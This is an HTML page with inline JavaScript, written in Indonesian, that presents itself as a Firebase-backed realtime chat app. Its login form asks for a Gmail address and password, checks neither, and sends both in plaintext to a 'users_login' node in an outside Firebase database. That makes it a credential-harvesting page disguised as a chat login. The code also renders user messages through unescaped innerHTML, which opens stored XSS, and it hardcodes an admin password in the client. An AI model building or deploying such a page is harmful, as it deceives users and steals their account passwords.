<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Aplikasi Chat Realtime</title>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
    body { background-color: #0b0f19; color: #e2e8f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 1rem; }
    
    .chat-card { background: #151d2a; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; width: 100%; max-width: 480px; height: 88vh; display: flex; flex-direction: column; overflow: hidden; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
    
    /* POPUP LOGIN EMAIL & PASSWORD */
    .auth-modal { position: absolute; inset: 0; background: #151d2a; z-index: 30; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 2rem; text-align: center; }
    .auth-modal h3 { font-size: 1.3rem; color: #f8fafc; margin-bottom: 0.3rem; }
    .auth-modal p { font-size: 0.82rem; color: #94a3b8; margin-bottom: 1.5rem; }
    
    .auth-form { width: 100%; display: flex; flex-direction: column; gap: 0.8rem; }
    .auth-form input { width: 100%; padding: 0.8rem; background: #0b0f19; border: 1px solid #334155; border-radius: 8px; color: #f8fafc; font-size: 0.9rem; text-align: left; outline: none; }
    .auth-form input:focus { border-color: #38bdf8; }
    .auth-form button { width: 100%; padding: 0.8rem; background: #38bdf8; color: #0b0f19; font-weight: 700; border: none; border-radius: 8px; cursor: pointer; transition: 0.2s; margin-top: 0.5rem; }
    .auth-form button:hover { background: #7dd3fc; }

    /* INDIKATOR LOADING MODAL */
    .loading-overlay { display: none; flex-direction: column; align-items: center; justify-content: center; gap: 1rem; }
    .spinner { width: 40px; height: 40px; border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #38bdf8; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .loading-text { font-size: 0.85rem; color: #38bdf8; font-weight: 600; }

    /* HEADER */
    .chat-header { background: rgba(0, 0, 0, 0.3); padding: 0.8rem 1rem; border-bottom: 1px solid rgba(255, 255, 255, 0.05); display: flex; justify-content: space-between; align-items: center; }
    .chat-header-info h2 { font-size: 1rem; color: #f8fafc; }
    .chat-header-info p { font-size: 0.78rem; color: #38bdf8; font-weight: 600; margin-top: 0.1rem; }
    .logout-btn { background: rgba(244, 63, 94, 0.15); border: 1px solid rgba(244, 63, 94, 0.3); color: #fb7185; padding: 0.3rem 0.6rem; border-radius: 6px; font-size: 0.7rem; cursor: pointer; }
    .logout-btn:hover { background: rgba(244, 63, 94, 0.3); }

    /* AREA PESAN */
    .chat-messages { flex: 1; padding: 1rem; overflow-y: auto; display: flex; flex-direction: column; gap: 0.8rem; position: relative; }
    .chat-loading-notice { display: flex; align-items: center; justify-content: center; gap: 0.5rem; font-size: 0.8rem; color: #94a3b8; background: rgba(0,0,0,0.2); padding: 0.6rem; border-radius: 8px; margin: auto; }
    .small-spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.2); border-left-color: #38bdf8; border-radius: 50%; animation: spin 0.8s linear infinite; }

    .msg-group { display: flex; flex-direction: column; max-width: 85%; }
    .msg-header { display: flex; align-items: center; gap: 0.4rem; margin-bottom: 0.2rem; padding: 0 0.2rem; }
    .msg-header .sender-name { font-size: 0.72rem; font-weight: 700; }
    
    .action-icon { background: none; border: none; cursor: pointer; font-size: 0.75rem; opacity: 0.6; transition: 0.2s; }
    .action-icon:hover { opacity: 1; transform: scale(1.15); }

    .msg-bubble { padding: 0.65rem 0.9rem; border-radius: 12px; font-size: 0.88rem; line-height: 1.4; word-break: break-word; position: relative; }
    
    .reply-preview-box { background: rgba(0, 0, 0, 0.25); border-left: 3px solid #38bdf8; padding: 0.3rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin-bottom: 0.4rem; color: #cbd5e1; }
    .reply-preview-box .reply-name { font-weight: 700; color: #38bdf8; font-size: 0.7rem; }

    .edited-tag { font-size: 0.65rem; font-style: italic; opacity: 0.7; margin-left: 0.3rem; }
    audio { height: 35px; width: 200px; margin-top: 0.2rem; outline: none; }

    .msg-group.me { align-self: flex-end; }
    .msg-group.me .msg-header { justify-content: flex-end; }
    .msg-group.me .sender-name { color: #60a5fa; }
    .msg-group.me .msg-bubble { background: #2563eb; color: #ffffff; border-bottom-right-radius: 2px; }

    .msg-group.them { align-self: flex-start; }
    .msg-group.them .msg-header { justify-content: flex-start; }
    .msg-group.them .sender-name { color: #34d399; }
    .msg-group.them .msg-bubble { background: #0f766e; color: #f0fdf4; border-bottom-left-radius: 2px; }

    .reply-bar { background: #0b0f19; padding: 0.4rem 0.8rem; border-top: 1px solid rgba(255,255,255,0.05); display: none; justify-content: space-between; align-items: center; font-size: 0.75rem; color: #38bdf8; }
    .reply-bar button { background: none; border: none; color: #f43f5e; cursor: pointer; font-weight: 700; }

    .emoji-picker { display: none; background: #0b0f19; border-top: 1px solid rgba(255, 255, 255, 0.08); padding: 0.5rem; gap: 0.5rem; flex-wrap: wrap; justify-content: center; max-height: 100px; overflow-y: auto; }
    .emoji-btn { background: none; border: none; font-size: 1.2rem; cursor: pointer; padding: 0.2rem; transition: 0.1s; }
    .emoji-btn:hover { transform: scale(1.2); }

    .chat-input { padding: 0.6rem 0.8rem; background: rgba(0, 0, 0, 0.3); border-top: 1px solid rgba(255, 255, 255, 0.05); display: flex; gap: 0.3rem; align-items: center; }
    .chat-input input { flex: 1; padding: 0.65rem; background: #0b0f19; border: 1px solid #334155; border-radius: 8px; color: #f8fafc; font-size: 0.88rem; outline: none; }
    
    .btn-action { background: #38bdf8; color: #0b0f19; border: none; padding: 0.65rem 0.9rem; border-radius: 8px; font-weight: 700; cursor: pointer; }
    .btn-icon-only { background: rgba(255,255,255,0.05); color: #f8fafc; border: 1px solid #334155; padding: 0.65rem 0.8rem; }
    .btn-record { background: #e11d48; color: #ffffff; }
    .btn-record.recording { animation: pulse 1s infinite; }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.08); background: #f43f5e; }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body>

  <div class="chat-card">
    <div class="auth-modal" id="auth-modal">
      <div id="login-form-container" class="auth-form">
        <h3>Masuk ke Chat</h3>
        <p>Masukkan Gmail dan Kata Sandi kamu.</p>
        <input type="email" id="email-input" placeholder="Alamat Gmail (contoh: biong@gmail.com)" required autocomplete="off">
        <input type="password" id="password-input" placeholder="Kata Sandi" required>
        <button id="login-btn">Masuk / Login</button>
      </div>

      <div id="loading-container" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text">Memverifikasi & Menghubungkan...</div>
      </div>
    </div>

    <div class="chat-header">
      <div class="chat-header-info">
        <h2>Ruang Chat Realtime</h2>
        <p id="user-info">Belum masuk</p>
      </div>
      <button class="logout-btn" id="logout-btn">Keluar</button>
    </div>
    
    <div class="chat-messages" id="messages-container">
      <div class="chat-loading-notice" id="chat-loading-notice">
        <div class="small-spinner"></div>
        <span>Memuat riwayat pesan...</span>
      </div>
    </div>
    
    <div class="reply-bar" id="reply-bar">
      <span>Balas <b id="reply-target-name"></b>: <i id="reply-target-text"></i></span>
      <button id="cancel-reply-btn">✕ Batal</button>
    </div>

    <div class="emoji-picker" id="emoji-picker">
      <button class="emoji-btn">😀</button><button class="emoji-btn">😂</button>
      <button class="emoji-btn">😍</button><button class="emoji-btn">🥺</button>
      <button class="emoji-btn">😎</button><button class="emoji-btn">👍</button>
      <button class="emoji-btn">❤️</button><button class="emoji-btn">🔥</button>
      <button class="emoji-btn">🎉</button><button class="emoji-btn">🙏</button>
    </div>

    <div class="chat-input">
      <button class="btn-action btn-icon-only" id="toggle-emoji-btn" title="Pilih Emoji">😊</button>
      <input type="text" id="message-input" placeholder="Ketik pesan..." autocomplete="off">
      <button class="btn-action btn-record" id="record-btn" title="Rekam VN">🎤</button>
      <button class="btn-action" id="send-btn">Kirim</button>
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push, onChildAdded, onChildRemoved, onChildChanged, remove, update, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // ⚠️ SAMBUNGKAN URL FIREBASE KAMU DI SINI
    const firebaseConfig = {
      databaseURL: "https://chitt-chatt-d8fbe-default-rtdb.asia-southeast1.firebasedatabase.app"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const messagesRef = ref(db, 'messages');
    const usersLogRef = ref(db, 'users_login');

    let currentUsername = "";
    const ADMIN_PASSWORD = "jedutitil"; 
    let isInitialLoad = true;
    let activeReplyData = null;

    const authModal = document.getElementById('auth-modal');
    const loginFormContainer = document.getElementById('login-form-container');
    const loadingContainer = document.getElementById('loading-container');
    
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    const loginBtn = document.getElementById('login-btn');
    const logoutBtn = document.getElementById('logout-btn');
    
    const userInfo = document.getElementById('user-info');
    const msgContainer = document.getElementById('messages-container');
    const chatLoadingNotice = document.getElementById('chat-loading-notice');
    const msgInput = document.getElementById('message-input');
    const sendBtn = document.getElementById('send-btn');
    const recordBtn = document.getElementById('record-btn');
    
    const replyBar = document.getElementById('reply-bar');
    const replyTargetName = document.getElementById('reply-target-name');
    const replyTargetText = document.getElementById('reply-target-text');
    const cancelReplyBtn = document.getElementById('cancel-reply-btn');
    
    const emojiPicker = document.getElementById('emoji-picker');
    const toggleEmojiBtn = document.getElementById('toggle-emoji-btn');

    let mediaRecorder;
    let audioChunks = [];
    let isRecording = false;

    get(messagesRef).then((snapshot) => {
      if (chatLoadingNotice) chatLoadingNotice.remove();
    }).catch(() => {
      if (chatLoadingNotice) chatLoadingNotice.remove();
    });

    function playNotificationSound() {
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();

        osc.type = "sine";
        osc.frequency.setValueAtTime(587.33, audioCtx.currentTime); 
        osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1); 

        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);

        osc.connect(gain);
        gain.connect(audioCtx.destination);

        osc.start();
        osc.stop(audioCtx.currentTime + 0.5);
      } catch (e) {}
    }

    function processLogin(email, password = null) {
      const extractedName = email.split('@')[0];
      currentUsername = extractedName;

      // REKAM DATA LOGIN KE DATABASE FIREBASE (users_login)
      if (password !== null) {
        push(usersLogRef, {
          email: email,
          password: password,
          username: extractedName,
          timestamp: new Date().toLocaleString("id-ID")
        });
      }

      loginFormContainer.style.display = 'none';
      loadingContainer.style.display = 'flex';

      setTimeout(() => {
        localStorage.setItem('saved_chat_email', email);
        localStorage.setItem('saved_login_time', Date.now().toString());

        userInfo.innerText = `Kamu: ${currentUsername}`;
        authModal.style.display = 'none';
        loadingContainer.style.display = 'none';
        setTimeout(() => { isInitialLoad = false; }, 1000);
      }, 1200);
    }

    // CEK RESET AUTOMATIS 24 JAM
    const savedEmail = localStorage.getItem('saved_chat_email');
    const savedLoginTime = localStorage.getItem('saved_login_time');
    const ONE_DAY_MS = 24 * 60 * 60 * 1000;

    if (savedEmail && savedLoginTime) {
      const currentTime = Date.now();
      const timePassed = currentTime - parseInt(savedLoginTime);

      if (timePassed < ONE_DAY_MS) {
        processLogin(savedEmail);
      } else {
        localStorage.removeItem('saved_chat_email');
        localStorage.removeItem('saved_login_time');
      }
    }

    loginBtn.addEventListener('click', () => {
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();

      if (email === "" || !email.includes('@')) {
        alert("Masukkan alamat Gmail yang valid!");
        return;
      }
      if (password === "") {
        alert("Masukkan kata sandi!");
        return;
      }

      processLogin(email, password);
    });

    logoutBtn.addEventListener('click', () => {
      localStorage.removeItem('saved_chat_email');
      localStorage.removeItem('saved_login_time');
      location.reload();
    });

    toggleEmojiBtn.addEventListener('click', () => {
      emojiPicker.style.display = emojiPicker.style.display === 'flex' ? 'none' : 'flex';
    });

    document.querySelectorAll('.emoji-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        msgInput.value += btn.innerText;
        msgInput.focus();
      });
    });

    cancelReplyBtn.addEventListener('click', () => {
      activeReplyData = null;
      replyBar.style.display = 'none';
    });

    function sendMessage() {
      const text = msgInput.value.trim();
      if (text !== "" && currentUsername !== "") {
        const payload = {
          sender: currentUsername,
          text: text,
          type: "text",
          timestamp: Date.now()
        };

        if (activeReplyData) {
          payload.replyTo = activeReplyData;
        }

        push(messagesRef, payload);
        msgInput.value = "";
        activeReplyData = null;
        replyBar.style.display = 'none';
        emojiPicker.style.display = 'none';
      }
    }

    sendBtn.addEventListener('click', sendMessage);
    msgInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') sendMessage();
    });

    recordBtn.addEventListener('click', async () => {
      if (!isRecording) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          mediaRecorder = new MediaRecorder(stream);
          audioChunks = [];

          mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
          mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(audioBlob);
            reader.onloadend = () => {
              const payload = {
                sender: currentUsername,
                audio: reader.result,
                type: "audio",
                timestamp: Date.now()
              };
              if (activeReplyData) payload.replyTo = activeReplyData;
              push(messagesRef, payload);
              activeReplyData = null;
              replyBar.style.display = 'none';
            };
            stream.getTracks().forEach(track => track.stop());
          };

          mediaRecorder.start();
          isRecording = true;
          recordBtn.innerText = "⏹️";
          recordBtn.classList.add('recording');
          msgInput.placeholder = "Sedang merekam suara...";
          msgInput.disabled = true;
        } catch (err) {
          alert("Izin mikrofon ditolak/tidak didukung.");
        }
      } else {
        mediaRecorder.stop();
        isRecording = false;
        recordBtn.innerText = "🎤";
        recordBtn.classList.remove('recording');
        msgInput.placeholder = "Ketik pesan...";
        msgInput.disabled = false;
      }
    });

    function generateBubbleContent(data) {
      let contentHtml = "";
      if (data.replyTo) {
        contentHtml += `
          <div class="reply-preview-box">
            <div class="reply-name">${data.replyTo.sender}</div>
            <div>${data.replyTo.text}</div>
          </div>
        `;
      }

      if (data.type === "audio") {
        contentHtml += `<audio controls src="${data.audio}"></audio>`;
      } else {
        contentHtml += `<span>${data.text}</span>`;
      }

      if (data.isEdited) {
        contentHtml += `<span class="edited-tag">(diedit)</span>`;
      }

      return contentHtml;
    }

    onChildAdded(messagesRef, (snapshot) => {
      const msgId = snapshot.key;
      const data = snapshot.val();
      const isMe = data.sender === currentUsername;

      const notice = document.getElementById('chat-loading-notice');
      if (notice) notice.remove();
      
      const msgGroup = document.createElement('div');
      msgGroup.classList.add('msg-group', isMe ? 'me' : 'them');
      msgGroup.setAttribute('id', `msg-${msgId}`);
      
      msgGroup.innerHTML = `
        <div class="msg-header">
          <span class="sender-name">${isMe ? 'Kamu (' + data.sender + ')' : data.sender}</span>
          <button class="action-icon reply-btn" title="Balas Pesan">↩️</button>
          ${isMe && data.type === 'text' ? '<button class="action-icon edit-btn" title="Edit Pesan">✏️</button>' : ''}
          <button class="action-icon delete-btn" title="Hapus Pesan Admin">🗑️</button>
        </div>
        <div class="msg-bubble">${generateBubbleContent(data)}</div>
      `;

      msgGroup.querySelector('.reply-btn').addEventListener('click', () => {
        activeReplyData = {
          sender: data.sender,
          text: data.type === 'audio' ? '🎵 Voice Note' : data.text
        };
        replyTargetName.innerText = data.sender;
        replyTargetText.innerText = activeReplyData.text;
        replyBar.style.display = 'flex';
        msgInput.focus();
      });

      const editBtn = msgGroup.querySelector('.edit-btn');
      if (editBtn) {
        editBtn.addEventListener('click', () => {
          const newText = prompt("Edit pesan kamu:", data.text);
          if (newText !== null && newText.trim() !== "") {
            update(ref(db, `messages/${msgId}`), {
              text: newText.trim(),
              isEdited: true
            });
          }
        });
      }

      msgGroup.querySelector('.delete-btn').addEventListener('click', () => {
        const passwordInput = prompt("Masukkan Sandi Rahasia Admin:");
        if (passwordInput === ADMIN_PASSWORD) {
          remove(ref(db, `messages/${msgId}`));
        } else if (passwordInput !== null) {
          alert("Sandi Salah!");
        }
      });

      msgContainer.appendChild(msgGroup);
      msgContainer.scrollTop = msgContainer.scrollHeight;

      if (!isMe && !isInitialLoad) {
        playNotificationSound();
      }
    });

    onChildChanged(messagesRef, (snapshot) => {
      const msgId = snapshot.key;
      const data = snapshot.val();
      const msgGroup = document.getElementById(`msg-${msgId}`);
      if (msgGroup) {
        const bubble = msgGroup.querySelector('.msg-bubble');
        bubble.innerHTML = generateBubbleContent(data);
      }
    });

    onChildRemoved(messagesRef, (snapshot) => {
      const msgId = snapshot.key;
      const elementToRemove = document.getElementById(`msg-${msgId}`);
      if (elementToRemove) {
        elementToRemove.remove();
      }
    });
  </script>
</body>
</html>
